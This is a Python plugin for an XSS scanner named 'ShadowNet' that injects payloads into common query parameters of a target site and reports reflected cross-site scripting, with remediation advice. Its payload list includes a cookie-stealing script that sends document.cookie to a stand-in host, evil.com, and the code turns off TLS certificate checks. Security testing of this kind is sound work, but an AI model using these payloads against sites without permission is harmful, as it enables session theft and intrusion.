"""ShadowNet - XSS (Cross-Site Scripting) Detector"""
import urllib.request
import urllib.parse
import urllib.error
import ssl
import re

DESCRIPTION = "Detect reflected and stored XSS vulnerabilities in web applications"
AUTHOR = "pxdays"
VERSION = "1.0"
REQUIRES = []
TIMEOUT = 180

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\" onmouseover=\"alert(1)\"",
    "javascript:alert(1)",
    "\"-alert(1)-\"",
    "'-alert(1)-'",
    "<ScRiPt>alert(1)</sCrIpT>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<script>fetch('https://evil.com/'+document.cookie)</script>",
]

XSS_PATTERNS = [
    (r'<script>alert\(1\)</script>', 'Reflected XSS (Script Tag)'),
    (r'<img src=x onerror=alert\(1\)>', 'Reflected XSS (Img Onerror)'),
    (r'<svg onload=alert\(1\)>', 'Reflected XSS (SVG Onload)'),
    (r'alert\(1\)', 'Reflected XSS (Generic Alert)'),
    (r'<ScRiPt>alert\(1\)</sCrIpT>', 'Reflected XSS (Case Bypass)'),
]

def run(target, engine):
    base_url = target['url'].rstrip('/')
    engine.print_status(f"Testing for XSS vulnerabilities on {base_url}...", "warn")
    
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    try:
        req = urllib.request.Request(base_url, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        body = resp.read().decode('utf-8', errors='ignore')
        
        # Find all forms
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.IGNORECASE)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', body, re.IGNORECASE)
        params = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', body, re.IGNORECASE)
        
        # Find URL parameters
        parsed = urllib.parse.urlparse(base_url)
        url_params = urllib.parse.parse_qs(parsed.query)
        
        test_endpoints = []
        
        # If URL already has params, use those
        if url_params:
            test_endpoints.append(base_url)
        
        # Add common params to test
        for param in ['q', 's', 'search', 'id', 'page', 'p', 'name', 'user', 'cat', 'msg', 'message', 'error', 'redirect', 'url', 'next', 'return']:
            test_endpoints.append(f"{base_url}?{param}=test")
        
        # Limit to first 10
        test_endpoints = test_endpoints[:10]
        
        engine.print_status(f"Testing {len(test_endpoints)} endpoints against {len(XSS_PAYLOADS)} payloads...", "info")
        
        tested = 0
        for endpoint in test_endpoints:
            for payload in XSS_PAYLOADS[:6]:  # First 6 payloads per endpoint
                tested += 1
                
                try:
                    # Inject payload into each parameter
                    parsed = urllib.parse.urlparse(endpoint)
                    ep_params = urllib.parse.parse_qs(parsed.query)
                    
                    if not ep_params:
                        # If no params, add one
                        test_url = f"{endpoint}{'&' if '?' in endpoint else '?'}q={urllib.parse.quote(payload)}"
                    else:
                        # Inject into first param
                        param_name = list(ep_params.keys())[0]
                        ep_params[param_name] = [payload]
                        new_query = urllib.parse.urlencode(ep_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, new_query, parsed.fragment
                        ))
                    
                    test_req = urllib.request.Request(test_url, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    })
                    test_resp = urllib.request.urlopen(test_req, timeout=5, context=ctx)
                    test_body = test_resp.read().decode('utf-8', errors='ignore')
                    
                    for pattern, name in XSS_PATTERNS:
                        if re.search(pattern, test_body, re.IGNORECASE):
                            engine.print_status(f"XSS FOUND: {name} on param '{param_name if ep_params else 'q'}'", "error")
                            findings.append({
                                "severity": "critical",
                                "title": f"XSS: {name}",
                                "description": f"Reflected XSS vulnerability detected on {base_url}",
                                "detail": f"URL: {test_url}\nPayload: {payload}\nPattern: {name}\nParameter: {param_name if ep_params else 'q'}",
                                "remediation": "Sanitize all user inputs. Use Content Security Policy headers. Encode output properly.",
                                "raw_data": {"url": test_url, "payload": payload, "param": param_name if ep_params else 'q'}
                            })
                            break
                
                except Exception:
                    continue
            
            if tested > 20:
                break  # Don't be too aggressive
        
        # Also check for XSS in hash/URL fragments
        engine.print_status(f"Tested {tested} combinations", "info")
        
    except Exception as e:
        engine.print_status(f"XSS scan error: {e}", "warn")
    
    if not findings:
        engine.print_status("No XSS detected (basic scan)", "ok")
    
    return findings
